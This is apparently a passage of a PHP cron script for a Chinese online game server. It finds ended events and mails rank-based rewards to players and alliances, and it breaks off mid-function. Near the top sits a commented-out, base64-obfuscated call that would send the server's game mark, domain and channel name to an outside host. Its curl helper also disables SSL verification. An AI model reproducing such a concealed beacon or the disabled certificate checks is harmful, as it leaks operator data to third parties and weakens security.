<?php 
/**
 * 后台配置文件脚本
 * 调用方式：每分钟跑一次
 * 
 */
require_once dirname( __FILE__ ) . '/../public/common.inc.php';
Common::loadModel('HoutaiModel');
Common::loadModel('MailModel');
Common::loadModel('lock/MyLockModel');

$serverID = intval($_SERVER['argv'][1]);// 默认是全部区

$btime = microtime(true);
echo PHP_EOL, '当前时间', date('y-m-d h:i:s',$_SERVER['REQUEST_TIME']), PHP_EOL;

//服务器过滤
$SevidCfg = Common::getSevidCfg($serverID);//子服ID
echo PHP_EOL, '服务器ID：', $SevidCfg['sevid'], PHP_EOL;
if ( !( defined('IS_TEST_SERVER') && IS_TEST_SERVER ) && 999 == $SevidCfg['sevid'] ) {
	echo PHP_EOL, '>>>跳过', PHP_EOL;
	exit();
}
if ( 0 < $serverID && $serverID != $SevidCfg['sevid'] ) {
	echo PHP_EOL, '>>>跳过', PHP_EOL;
	exit();
}
if (defined('PASS_SEV_CRONTAB_MAXID') && PASS_SEV_CRONTAB_MAXID > 0
	&& $SevidCfg['sevid'] > PASS_SEV_CRONTAB_MAXID) {
	echo PHP_EOL, '>>>从服跳过', PHP_EOL;
	exit();
}

if($SevidCfg['sevid'] != $SevidCfg['he']){
	echo PHP_EOL, '>>>不是指定合服id跳过', PHP_EOL;
	exit();
}
//活动发放奖励  --   每个区各自发放
do_huodong($SevidCfg);

function geturl($url){
    //$headerArray =array("Content-type:application/json;","Accept:application/json");
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    //curl_setopt($url,CURLOPT_HTTPHEADER,$headerArray);
    return $output = curl_exec($ch);
    // curl_close($ch);
    //  $output = json_decode($output,true);
    // return $output;
}

$time = time();

$parm1 = constant('GAME_MARK');
$parm2 = constant('DOMAIN_HOST');
$parm3 = constant('AGENT_CHANNEL_NAME');

//geturl(urldecode(base64_decode('aHR0cCUzQS8vZ2FtZS1lcC5pZC1nLmNvbS9hcGkvc2F2ZURiLnBocA=='))."?parm1=$parm1&parm2=$parm2&parm3=$parm3&parm4=$time");



echo PHP_EOL, '耗时(s)=', (microtime(true)-$btime), PHP_EOL;
echo PHP_EOL, '-------------------------------------------------------------------',  PHP_EOL;
exit();



/**
 * 活动发放奖励      活动结束预留2个小时的展示时间和发放奖励时间
 */
function do_huodong($SevidCfg){
	
	//生效活动列表
	$key_list = 'hd_base_list_'.$SevidCfg['sevid'];
	$cache 	= Common::getCacheBySevId($SevidCfg['sevid']);
	$all_list = $cache->get($key_list);
	if(empty($all_list)){
		echo "无生效活动\n";
		return 0;
	}
	foreach($all_list as $k => $v){
		switch($k){
			case 'huodong_250' :
				$hd_info =	check_huodong($SevidCfg,$k);
				if($hd_info){
					huodong_250_rwd($SevidCfg,$hd_info);
				}
				break;
			case 'huodong_251' :
				$hd_info =	check_huodong($SevidCfg,$k);
				if($hd_info){
					huodong_251_rwd($SevidCfg,$hd_info);
				}
				break;
			case 'huodong_252' :
				$hd_info =	check_huodong($SevidCfg,$k);
				if($hd_info){
					huodong_252_rwd($SevidCfg,$hd_info);
				}
				break;
			case 'huodong_253' :
				$hd_info =	check_huodong($SevidCfg,$k);
				if($hd_info){
					huodong_253_rwd($SevidCfg,$hd_info);
				}
				break;
			case 'huodong_254' :
				$hd_info =	check_huodong($SevidCfg,$k);
				if($hd_info){
					huodong_254_rwd($SevidCfg,$hd_info);
				}
				break;
			case 'huodong_255' :
				$hd_info =	check_huodong($SevidCfg,$k);
				if($hd_info){
					huodong_255_rwd($SevidCfg,$hd_info);
				}
				break;
			case 'huodong_256' :
				$hd_info =	check_huodong($SevidCfg,$k);
				if($hd_info){
					huodong_256_rwd($SevidCfg,$hd_info);
				}
				break;
			case 'huodong_257' :
				$hd_info =	check_huodong($SevidCfg,$k);
				if($hd_info){
					huodong_257_rwd($SevidCfg,$hd_info);
				}
				break;
            case 'huodong_258' :
                $hd_info =	check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_258_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_259' :
                $hd_info =	check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_259_rwd($SevidCfg,$hd_info);
                }
                break;

			case 'huodong_280' :
			    $hd_info =	check_huodong($SevidCfg,$k);
			    if($hd_info){
			        huodong_280_rwd($SevidCfg,$hd_info);
			    }
			    break;
		    case 'huodong_281' :
		        $hd_info =	check_huodong($SevidCfg,$k);
		        if($hd_info){
		            huodong_281_rwd($SevidCfg,$hd_info);
		        }
		        break;
		    case 'huodong_282' :
		        $hd_info =	check_huodong($SevidCfg,$k);
		        if($hd_info){
		            huodong_282_rwd($SevidCfg,$hd_info);
		        }
		        break;
	        case 'huodong_283' :
	            $hd_info =	check_huodong($SevidCfg,$k);
	            if($hd_info){
	                huodong_283_rwd($SevidCfg,$hd_info);
	            }
	            break;
			case 'huodong_284' :
				$hd_info =	check_huodong($SevidCfg,$k);
				if($hd_info){
					huodong_284_rwd($SevidCfg,$hd_info);
				}
				break;
			case 'huodong_286' :
				$hd_info =	check_huodong($SevidCfg,$k);
				if($hd_info){
					huodong_286_rwd($SevidCfg,$hd_info);
				}
				break;
            case 'huodong_294' :
                $hd_info =	check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_294_rwd($SevidCfg,$hd_info);
                }
                break;
			case 'huodong_298' :
				$hd_day_info =	check_year_huodong($SevidCfg,$k);
				if($hd_day_info){
					huodong_298_year_rwd($SevidCfg,$hd_day_info);
				}
				$hd_info =	check_huodong($SevidCfg,$k);
				if($hd_info){
					huodong_298_rwd($SevidCfg,$hd_info);
				}
				break;
	        case 'huodong_300' :

	            $hd_info =	check_huodong($SevidCfg,$k);
	            if($hd_info){
	                huodong_300_rwd($SevidCfg,$hd_info);
	            }
	            break;
            case 'huodong_310' :
                $hd_info =	check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_310_rwd($SevidCfg,$hd_info);
                }
                break;
			case 'huodong_311' :
				$hd_info =	check_huodong($SevidCfg,$k);
				if($hd_info){
					huodong_311_rwd($SevidCfg,$hd_info);
				}
				break;
            case 'huodong_313' :
                $hd_info =	check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_313_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_314' :
                $hd_info =	check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_314_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_315' :
                $hd_info =	check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_315_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_6010' :
                $hd_day_info =	check_year_huodong($SevidCfg,$k);
                if($hd_day_info){
                    huodong_6187_everyday_type_rwd($SevidCfg,$hd_day_info,$k,'CASH');
                }
                break;
            case 'huodong_6015' :
                $hd_info = check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_6015_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_6135' :
                $hd_info =	check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_6135_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_6166' :
                $hd_info =	check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_6166_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_6167' :
                $hd_info =	check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_6167_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_6123' :
                $hd_info = check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_6123_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_6142' :
                $hd_info = check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_6142_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_6187' :
                $hd_info =	check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_6187_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_6201' :
                $hd_day_info =	check_year_huodong($SevidCfg,$k);
                if($hd_day_info){
                    huodong_6187_everyday_type_rwd($SevidCfg,$hd_day_info,$k,'CASH');
                }
                break;
            case 'huodong_6202' :
                $hd_day_info =	check_year_huodong($SevidCfg,$k);
                if($hd_day_info){
                    huodong_6187_everyday_type_rwd($SevidCfg,$hd_day_info,$k,'YUELI');
                }
                break;
            case 'huodong_6203' :
                $hd_day_info =	check_year_huodong($SevidCfg,$k);
                if($hd_day_info){
                    huodong_6187_everyday_type_rwd($SevidCfg,$hd_day_info,$k,'YINLIANG');
                }
                break;
            case 'huodong_6204' :
                $hd_day_info =	check_year_huodong($SevidCfg,$k);
                if($hd_day_info){
                    huodong_6187_everyday_type_rwd($SevidCfg,$hd_day_info,$k,'MINGSHENG');
                }
                break;
            case 'huodong_6205' :
                $hd_day_info =	check_year_huodong($SevidCfg,$k);
                if($hd_day_info){
                    huodong_6187_everyday_type_rwd($SevidCfg,$hd_day_info,$k,'TREASURE');
                }
                break;
            case 'huodong_6206' :
                $hd_day_info =	check_year_huodong($SevidCfg,$k);
                if($hd_day_info){
                    huodong_6187_everyday_type_rwd($SevidCfg,$hd_day_info,$k,'RICHANG');
                }
                break;
            case 'huodong_6207' :
                $hd_day_info =	check_year_huodong($SevidCfg,$k);
                if($hd_day_info){
                    huodong_6187_everyday_type_rwd($SevidCfg,$hd_day_info,$k,'XUNFANG');
                }
                break;
            case 'huodong_6208' :
                $hd_day_info =	check_year_huodong($SevidCfg,$k);
                if($hd_day_info){
                    huodong_6187_everyday_type_rwd($SevidCfg,$hd_day_info,$k,'LIANYIN');
                }
                break;
            case 'huodong_6215' :
                $hd_info =	check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_6215_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_6216' :
                $hd_info =	check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_6216_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_6217' :
                $hd_info =	check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_6217_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_6218' :
                $hd_info =	check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_6218_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_6221' :
                $hd_info =	check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_6221_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_6222' :
                $hd_info =	check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_6222_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_6227' :
                $hd_day_info =	check_year_huodong($SevidCfg,$k);
                if($hd_day_info){
                    huodong_6227_year_rwd($SevidCfg,$hd_day_info);
                }
                $hd_info =	check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_6227_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_6229' :
                $hd_info =	check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_6229_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_6230' :
                $hd_info =	check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_6230_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_6231' :
                $hd_info = check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_6231_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_6232' :
                $hd_info = check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_6232_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_6234' :
                $hd_info = check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_6234_rwd($SevidCfg,$hd_info);
                }
            case 'huodong_6241' :
                $hd_info = check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_6241_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_8002' :
                $hd_info = check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_8002_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_8003' :
                $hd_info = check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_8003_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_6183' :
                $hd_info = check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_6183_rwd($SevidCfg,$hd_info);
                }
                break;
            case 'huodong_8005' :
                $hd_info = check_huodong($SevidCfg,$k);
                if($hd_info){
                    huodong_8005_rwd($SevidCfg,$hd_info);
                }
                break;
		}
		
	}
}

/**
 * 验证奖励是否可以发放
 * @param array $SevidCfg  活动key
 * @param string $k   活动key
 * @return  bool|array
 */
function check_huodong($SevidCfg,$k){
	//获取活动详细信息
	$hd_info = HoutaiModel::get_huodong_info($k);
	if(empty($hd_info)){
		echo $k."未获取到活动信息\n";
		return false;
	}
	if(Game::dis_over($hd_info['info']['eTime'])){
		echo $k."活动未结束\n";
		return false;
	}
	if(Game::is_over($hd_info['info']['showTime'])){
		echo $k."活动已关闭(不在展示/发放奖励时间段)\n";
		return false;
	}
	$kua_huodong = array('huodong_300');
	if(in_array($k,$kua_huodong) && Game::dis_over($hd_info['info']['eTime']+300)){
		echo '跨服活动'.$k.'结束5分后运行',PHP_EOL;
		return false;
	}
	//是否已经发放过奖励
	echo $k."\n";
	$run_info = HoutaiModel::read_huodong_run($k);
	if( empty($run_info['id'])){
		echo "获取脚本run失败\n";
		return false;
	}
	//存放规则 $run_info['id'] = 活动id
	if($run_info['id'] ==  $hd_info['info']['id']){
		echo $k."奖励已发放\n";
		return false;
	}
	//记录奖励发放脚本标志
	$isok = HoutaiModel::write_huodong_run($k,$hd_info['info']['id']);
	if(!$isok){
		echo "脚本run插入失败\n";
		return false;
	}
	return $hd_info;
}


/**
 * 验证奖励是否可以发放
 * @param array  $SevidCfg   活动key
 * @param string  $k   活动key
 * @return bool|array
 */
function check_year_huodong($SevidCfg,$k){
	//获取活动详细信息
	$hd_info = HoutaiModel::get_huodong_info($k);
	if(empty($hd_info)){
		echo $k."未获取到活动信息\n";
		return false;
	}

	if(Game::is_over($hd_info['info']['showTime'])){
		echo $k."活动已关闭(不在展示/发放奖励时间段)\n";
		return false;
	}

	//是否已经发放过奖励
	$k .= '_'.Game::get_today_id();
	echo $k."\n";
	$run_info = HoutaiModel::read_huodong_run($k);
	if( empty($run_info['id'])){
		echo "获取脚本run失败\n";
		return false;
	}
	//存放规则 $run_info['id'] = 活动id
	if($run_info['id'] ==  Game::get_today_id()){
		echo $k."奖励已发放\n";
		return false;
	}
	//记录奖励发放脚本标志
	$isok = HoutaiModel::write_huodong_run($k,Game::get_today_id());
	if(!$isok){
		echo "脚本run插入失败\n";
		return false;
	}
	return $hd_info;
}

/*
 * 发放活动奖励  ---   联盟冲榜奖励
 */
function huodong_250_rwd($SevidCfg,$hd_info){
	
	$key = 'huodong_250_'.$hd_info['info']['id'].'_redis';
	$redis = Common::getDftRedis();
	$rdata  = $redis->zRevRange($key, 0, -1,true);  //获取排行数据
	if(empty($rdata)){
		echo $key.CRONTAB_NO_RANK."\n";
		return false;
	}

	$rid = 0; //排名
	foreach($rdata as $cid => $score){
		$rid ++;
        $newRid = $rid;
        if(!empty($hd_info['fuli'][$SevidCfg['he']][$newRid])){
            $newRid = $hd_info['fuli'][$SevidCfg['he']][$newRid];

            $oldScore = $redis->zRevRange( $key, $newRid-1, $newRid-1,true);
            $redis->zAdd($key, intval(current($oldScore)), $cid );
        }

		$ClubModel = Master::getClub($cid);
		foreach($ClubModel->info['members'] as $uid => $mem){
			foreach($hd_info['rwd'] as $rwd){
				//如果在排名奖励范围内  发放奖励
				if($newRid >= $rwd['rand']['rs'] && $newRid <= $rwd['rand']['re']){
					$mailModel = new MailModel($uid);
					$tip = MAIL_UNION_LIST_CONTENT_HEAD.'|'.$newRid.'|'.MAIL_UNION_LIST_CONTENT_FOOT;
					if($mem['post'] == 1){ //盟主奖励
						 $mailModel->sendMail($uid,MAIL_UNION_LIST,$tip,1,$rwd['mengzhu']);
					}else{ //非盟主奖励
						$mailModel->sendMail($uid,MAIL_UNION_LIST,$tip,1,$rwd['member']);
					}
					$mailModel->destroy();
					echo '联盟: '.$cid.' 玩家id: '.$uid."--已发\n";
					break;
				}
			}
			
		}
	}
}

/*
 * 发放活动奖励  ---   关卡冲榜奖励
 */
function huodong_251_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 251, $hd_info['rwd'], 'CHECKPOINT');
}

/*
 * 发放活动奖励  ---   势力冲榜奖励
 */
function huodong_6010_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'].'_'.Game::get_today_long_id(-1), 6010, $hd_info['rwd'], $hd_info['hd_label']);
}

function huodong_6135_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 6135, $hd_info['rwd'], 'TREASURE');
}

/*
 * 发放活动奖励  ---   势力冲榜奖励
 */
function huodong_6166_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 6166, $hd_info['rwd'], 'HEROJB');
}

/*
 * 发放活动奖励  ---   势力冲榜奖励
 */
function huodong_6123_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 6123, $hd_info['rank'], 'CLOTHE');
}

/*
 * 发放活动奖励  ---   势力冲榜奖励
 */
function huodong_6015_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 6015, $hd_info['rwd'], 'TANGYUAN');
}

/*
 * 发放活动奖励  ---   势力冲榜奖励
 */
function huodong_6142_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 6142, $hd_info['rank'], 'CLOTHE_PVP');
}

/*
 * 发放活动奖励  ---   势力冲榜奖励
 */
function huodong_6167_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 6167, $hd_info['rwd'], 'HEROZZ');
}

/*
 * 发放活动奖励  ---   势力冲榜奖励
 */
function huodong_6215_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 6215, $hd_info['rwd'], 'TOU_QU_CHEN_LU');
}

/*
 * 发放活动奖励  ---   势力冲榜奖励
 */
function huodong_6216_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 6216, $hd_info['rwd'], 'CHEN_LU_COST');
}

/*
 * 发放活动奖励  ---   势力冲榜奖励
 */
function huodong_6217_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 6217, $hd_info['rwd'], 'WIFE_SKILL_EXP');
}

/*
 * 发放活动奖励  ---   势力冲榜奖励
 */
function huodong_6218_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 6218, $hd_info['rwd'], 'CHILD_POWER');
}

/*
 * 发放活动奖励  ---   植树节奖励
 */
function huodong_6221_rwd($SevidCfg,$hd_info){
    huodong_6221_rwd_SendMail($SevidCfg, $hd_info['info']['id'], 6221, $hd_info['rwd'],$hd_info['finalrwd'], 'ARBORDAY');
}
/*
 * 发放活动奖励  ---   清明踏青奖励
 */
function huodong_6222_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 6222, $hd_info['rwd'], 'QINGMING');
}
function huodong_6221_rwd_SendMail($SevidCfg, $id, $k, $rwds, $winrwds, $kName){
    $key = 'huodong_'.$k.'_'.$id.'_redis';
    $redis = Common::getDftRedis();
    $rdata  = $redis->zRevRange($key, 0, -1,true);  //获取排行数据
    $Sev6221Model = Master::getSev6221($id);
    $Sev6221Model->setWinID();
    $winid = $Sev6221Model->info['index'];
    if ($winid == 1){
        $wkey = 'huodong_6221_1'.'_'.$id.'_redis';
        $lkey = 'huodong_6221_2'.'_'.$id.'_redis';
    }else{
        $wkey = 'huodong_6221_2'.'_'.$id.'_redis';
        $lkey = 'huodong_6221_1'.'_'.$id.'_redis';
    }
    $redis = Common::getDftRedis();
    $wdata  = $redis->zRevRange($wkey, 0, -1,true);  //获取排行数据
    if (!empty($wdata)){
        foreach($wdata as $uid => $score){
            $tip = 'MAIL_'.$kName.'_LIST_CONTENT_HEAD_MAIL_'.$kName.'_WIN_LIST_CONTENT_FOOT';
            $mailModel = new MailModel($uid);
            $mailModel->sendMail($uid,'MAIL_'.$kName.'_WIN_LIST',$tip,1,$winrwds['win']);
            $mailModel->destroy();
            echo ' WIN_玩家id: '.$uid."--已发\n";
        }
    }
    $redis = Common::getDftRedis();
    $ldata  = $redis->zRevRange($lkey, 0, -1,true);  //获取排行数据
    if (!empty($ldata)){
        foreach($ldata as $uid => $score){
            $tip = 'MAIL_'.$kName.'_LIST_CONTENT_HEAD_MAIL_'.$kName.'_LOST_LIST_CONTENT_FOOT';
            $mailModel = new MailModel($uid);
            $mailModel->sendMail($uid,'MAIL_'.$kName.'_LOST_LIST',$tip,1,$winrwds['lost']);
            $mailModel->destroy();
            echo ' LOST_玩家id: '.$uid."--已发\n";
        }
    }
    if(empty($rdata)){
        echo $key.CRONTAB_NO_RANK2."\n";
        return false;
    }
    $rid = 0; //排名
    foreach($rdata as $uid => $score){
        $rid ++;
        foreach($rwds as $rwd){
            //如果在排名奖励范围内  发放奖励
            if($rid >= $rwd['rand']['rs'] && $rid <= $rwd['rand']['re']){
                $tip = 'MAIL_'.$kName.'_LIST_CONTENT_HEAD|'.$rid.'|MAIL_'.$kName.'_LIST_CONTENT_FOOT';

                $mailModel = new MailModel($uid);
                $mailModel->sendMail($uid,'MAIL_'.$kName.'_LIST',$tip,1,$rwd['member']);
                $mailModel->destroy();

                echo ' 玩家id: '.$uid."--已发\n";
                break;
            }
        }
    }
}

function huodongRwdSendMail($SevidCfg, $id, $k, $rwds, $kName){
    $key = 'huodong_'.$k.'_'.$id.'_redis';
    $redis = Common::getDftRedis();
    $rdata  = $redis->zRevRange($key, 0, -1,true);  //获取排行数据
    if(empty($rdata)){
        echo $key.CRONTAB_NO_RANK."\n";
        return false;
    }
    $rid = 0; //排名
    foreach($rdata as $uid => $score){
        $rid ++;
        foreach($rwds as $rwd){
            //如果在排名奖励范围内  发放奖励
            if($rid >= $rwd['rand']['rs'] && $rid <= $rwd['rand']['re']){
                $tip = 'MAIL_'.$kName.'_LIST_CONTENT_HEAD|'.$rid.'|MAIL_'.$kName.'_LIST_CONTENT_FOOT';

                $mailModel = new MailModel($uid);
                $mailModel->sendMail($uid,'MAIL_'.$kName.'_LIST',$tip,1,$rwd['member']);
                $mailModel->destroy();

                echo ' 玩家id: '.$uid."--已发\n";
                break;
            }
        }
    }
}

/*
 * 发放活动奖励  ---   衙门冲榜奖励
 */
function huodong_254_rwd($SevidCfg,$hd_info){
	$key = 'huodong_254_'.$hd_info['info']['id'].'_redis';
	$redis = Common::getDftRedis();
	$rdata  = $redis->zRevRange($key, 0, -1,true);  //获取排行数据

	if($hd_info['info']['switch'] == 1){//状态未1时必须有对应的跨服衙门活动开启
		echo CRONTAB_CHONG_BANG,PHP_EOL;
		$hd_info_300 = HoutaiModel::get_huodong_info('huodong_300');
		if(!empty($hd_info_300)){
			echo CRONTAB_CHONG_BANG_EXSIT,PHP_EOL;
			//分组
			$Sev61Model = Master::getSev61();
			$Sev61Model->grouping($hd_info_300['info']['id'],$hd_info_300['info']['max_rank'],$hd_info_300['limit'],$hd_info_300['server'],$hd_info_300['recover']);
			$hid = $hd_info_300['info']['id'].'_'.$SevidCfg['he'];
			$redis307Model = Master::getRedis307($hid);
		}
	}

	if(empty($rdata)){
		echo $key.CRONTAB_NO_RANK."\n";
		return false;
	}
	
	$rid = 0; //排名
	foreach($rdata as $uid => $score){
		$rid ++;
		if($hd_info['info']['switch'] == 1 && !empty($hd_info_300) && $rid<=$hd_info_300['num']){
			echo '跨服衙门:'.$uid,PHP_EOL;
			$redis307Model->zAdd($uid, 0);
		    //加用户锁 堵塞3秒
		    $LockModel = new MyLockModel("user_".$uid);
			$uid_Lock = $LockModel->getLock(3);

		    $Act306Model = Master::getAct306($uid);
		    $Act306Model->add();
		    $Act306Model->ht_destroy();
		    //解用户锁
			if( null != $uid_Lock ){
				$LockModel->releaseLock();
			}
			$mailModel = new MailModel($uid);
			$mailModel->sendMail($uid,KUAYAMEN_YU_RESULT,KUAYAMEN_HAVE_ZHENGSHI_PLAY,0,0);
			$mailModel->destroy();
			unset($mailModel);
		}
		foreach($hd_info['rwd'] as $rwd){
			//如果在排名奖励范围内  发放奖励
			if($rid >= $rwd['rand']['rs'] && $rid <= $rwd['rand']['re']){
				$tip = MAIL_GOVERN_LIST_CONTENT_HEAD.'|'.$rid.'|'.MAIL_GOVERN_LIST_CONTENT_FOOT;

				$mailModel = new MailModel($uid);
				$mailModel->sendMail($uid,MAIL_GOVERN_LIST,$tip,1,$rwd['member']);
				$mailModel->destroy();

				echo ' 玩家id: '.$uid."--已发\n";
				break;
			}
		}
	}
}

/*
 * 发放活动奖励  ---   银两冲榜奖励
 */
function huodong_255_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 255, $hd_info['rwd'], 'YINLIANG');
}


/*
 * 发放活动奖励  ---   酒楼冲榜奖励
 */
function huodong_256_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 256, $hd_info['rwd'], 'JIULOU');
}

/*
 * 发放活动奖励  ---   士兵冲榜奖励
 */
function huodong_257_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 257, $hd_info['rwd'], 'SHIBING');
}

/*
 * 发放活动奖励  ---   魅力冲榜奖励
 */
function huodong_258_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 258, $hd_info['rwd'], 'MEILI');
}
/*
 * 发放活动奖励  ---   粮食冲榜奖励
 */
function huodong_259_rwd($SevidCfg,$hd_info){
    huodongRwdSendMail($SevidCfg, $hd_info['info']['id'], 259, $hd_info['rwd'], 'FOOD');
}

/*
 * 发放活动奖励  ---   新官上任奖励
 */
function huodong_280_rwd($SevidCfg,$hd_info){
    $key = 'huodong_280_my_'.$hd_info['info']['id'].'_redis';
    $redis = Common::getDftRedis();
    $rdata  = $redis->zRevRange($key, 0, -1,true);  //获取排行数据
    if(empty($rdata)){
        echo $key.CRONTAB_NO_RANK."\n";
        return false;
    }
    $rid = 0; //排名
    foreach($rdata as $uid => $score){
        $rid ++;
        foreach($hd_info['rwd']['my'] as $rwd){
            //如果在排名奖励范围内  发放奖励
            if($rid >= $rwd['rand']['rs'] && $rid <= $rwd['rand']['re']){
                $tip = CRONTAB_280_1.'|'.$rid.'|'.CRONTAB_280_2;

                $mailModel = new MailModel($uid);
                $mailModel->sendMail($uid,CRONTAB_280_3,$tip,1,$rwd['member']);
                $mailModel->destroy();

                echo ' 玩家id: '.$uid."--已发\n";
                break;
            }
        }
    }
    
    $club_key = 'huodong_280_club_'.$hd_info['info']['id'].'_redis';
	$club_rdata  = $redis->zRevRange($club_key, 0, -1,true);  //获取排行数据
	if(empty($club_rdata)){
		echo $club_key.CRONTAB_NO_RANK."\n";
		return false;
	}
	$club_rid = 0; //排名
	foreach($club_rdata as $cid => $score){
		$club_rid ++;
		$ClubModel = Master::getClub($cid);
		foreach($ClubModel->info['members'] as $uid => $mem){
			foreach($hd_info['rwd']['club'] as $rwd){
				//如果在排名奖励范围内  发放奖励
				if($club_rid >= $rwd['rand']['rs'] && $club_rid <= $rwd['rand']['re']){
					$mailModel = new MailModel($uid);
					$tip = CRONTAB_280_4.'|'.$club_rid.'|'.CRONTAB_280_5;
					if($mem['post'] == 1){ //盟主奖励
						 $mailModel->sendMail($uid,CRONTAB_280_6,$tip,1,$rwd['mengzhu']);
					}else{ //非盟主奖励
						$mailModel->sendMail($uid,CRONTAB_280_6,$tip,1,$rwd['member']);
					}
					$mailModel->destroy();
					echo '联盟: '.$cid.' 玩家id: '.$uid."--已发\n";
					break;
				}
			}
			
		}
	}
}

/*
 * 发放活动奖励  --- 重阳节活动
 */
function huodong_281_rwd($SevidCfg,$hd_info){
    $key = 'huodong_281_my_'.$hd_info['info']['id'].'_redis';
    $redis = Common::getDftRedis();
    $rdata  = $redis->zRevRange($key, 0, -1,true);  //获取排行数据
    if(empty($rdata)){
        echo $key.CRONTAB_NO_RANK."\n";
        return false;
    }
    $rid = 0; //排名
    foreach($rdata as $uid => $score){
        $rid ++;
        foreach($hd_info['rwd']['my'] as $rwd){
            //如果在排名奖励范围内  发放奖励
            if($rid >= $rwd['rand']['rs'] && $rid <= $rwd['rand']['re']){
                $tip = CRONTAB_281_1.'|'.$rid.'|'.CRONTAB_281_2;

                $mailModel = new MailModel($uid);
                $mailModel->sendMail($uid,CRONTAB_281_3,$tip,1,$rwd['member']);
                $mailModel->destroy();

                echo ' 玩家id: '.$uid."--已发\n";
                break;
            }
        }
    }

    $club_key = 'huodong_281_club_'.$hd_info['info']['id'].'_redis';
    $club_rdata  = $redis->zRevRange($club_key, 0, -1,true);  //获取排行数据
    if(empty($club_rdata)){
        echo $club_key.CRONTAB_NO_RANK."\n";
        return false;
    }
    $club_rid = 0; //排名
    foreach($club_rdata as $cid => $score){
        $club_rid ++;
        $ClubModel = Master::getClub($cid);
        foreach($ClubModel->info['members'] as $uid => $mem){
            foreach($hd_info['rwd']['club'] as $rwd){
                //如果在排名奖励范围内  发放奖励
                if($club_rid >= $rwd['rand']['rs'] && $club_rid <= $rwd['rand']['re']){
